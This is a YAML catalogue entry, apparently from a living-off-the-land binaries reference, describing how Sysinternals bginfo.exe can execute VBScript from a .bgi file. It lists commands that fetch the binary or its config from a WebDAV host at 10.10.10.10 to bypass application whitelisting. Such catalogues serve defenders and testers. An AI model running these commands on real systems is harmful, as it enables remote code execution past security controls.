---
name: bginfo.exe
description: Sysinternals tool to set desktop background with info
functions:
  execute:
    - description: Execute VBscript code that is referenced within the bginfo.bgi file.
      code: bginfo.exe bginfo.bgi /popup /nolicprompt
    - description: Execute bginfo.exe from a WebDAV server.
      code: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
    - description: This style of execution may not longer work due to patch.
      code: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
resources: 
    - resource: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
fullpath: 
    - path: No fixed path
notes: Thanks to Oddvar Moe - @oddvarmoe
---